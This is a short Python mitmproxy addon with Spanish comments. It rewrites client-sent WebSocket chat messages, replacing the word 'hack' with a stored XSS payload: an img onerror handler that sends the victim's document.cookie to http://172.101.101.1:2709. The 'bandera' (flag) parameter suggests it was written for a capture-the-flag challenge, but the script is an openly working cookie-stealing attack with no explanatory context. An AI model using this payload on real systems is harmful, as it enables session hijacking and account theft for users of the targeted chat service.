from mitmproxy import http
import json

class WSModifier:
    def websocket_message(self, flow):
        if not flow.websocket or not flow.websocket.messages:
            return
            
        message = flow.websocket.messages[-1]
        
        try:
            # Decodificar el contenido
            if isinstance(message.content, bytes):
                content_str = message.content.decode('utf-8')
            else:
                content_str = message.content
           
            data = json.loads(content_str)
            
            # CLIENTE → SERVIDOR (mensajes que envías)
            if message.from_client:
                # Modificar el campo "message" si existe
                if "message" in data and "hack" in data["message"].lower():
                    data["message"] = data["message"].replace("hack", "<img src='x' onerror=\"fetch('http://172.101.101.1:2709?bandera--'+document.cookie,{mode:'no-cors'})\">")
                    # Recodificar a JSON
                    message.content = json.dumps(data, separators=(',', ':')).encode('utf-8')
                    #print(f"✓ Modificado cliente: {data}")
            
            # else:
            #     # Modificar el campo "content" si existe
            #     if "content" in data:
            #         data["content"] = data["content"]
            #         message.content = json.dumps(data, separators=(',', ':')).encode('utf-8')
            #         #print(f"✓ Modificado servidor: {data}")
                    
        except json.JSONDecodeError:
            # Si no es JSON válido, dejar pasar
            f"⚠ No es JSON: {message.content}"
        except Exception as e:
            f"❌ Error: {e}"

addons = [WSModifier()] 